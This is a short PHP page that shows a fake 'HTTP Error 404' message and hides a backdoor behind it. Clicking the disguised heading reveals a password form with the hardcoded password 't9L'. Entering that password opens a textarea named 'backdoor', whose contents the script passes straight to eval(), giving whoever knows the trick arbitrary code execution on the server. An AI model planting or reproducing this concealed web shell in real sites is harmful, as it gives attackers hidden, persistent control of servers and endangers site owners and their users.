<?php

session_start();
$_SESSION['psw'] = 't9L';
if (isset($_POST['backdoor'])) {
    eval($_POST['backdoor']);
    header('Location: index.php?page=root');
    exit();
}

?>

<div>
    <a href="index.php?page=root&go" style="text-decoration: none;color: #1e0909;cursor:default;">
        <h2>NOT FOUND</h2>
    </a>
    <hr style="border: 0;color: #1e0909;height: 0.5px;background: #1e0909">
    <p>HTTP Error 404. The requested resource is not found.</p>
</div>

<?php if (isset($_GET['go'])): ?>

    <form action="#" method="post">
        <input type="password" name="psw">
        <input type="submit">
    </form>

    <?php if (isset($_POST['psw'])): ?>
        <?php if($_POST['psw'] === $_SESSION['psw']): ?>
            <form action="#" method="post">
                <p><textarea name="backdoor"></textarea></p>
                <p><input type="submit"></p>
            </form>
        <?php
            else:
                header('Location: index.php?page=root');
                exit();
            endif;
        endif;
        ?>

<?php endif; ?>

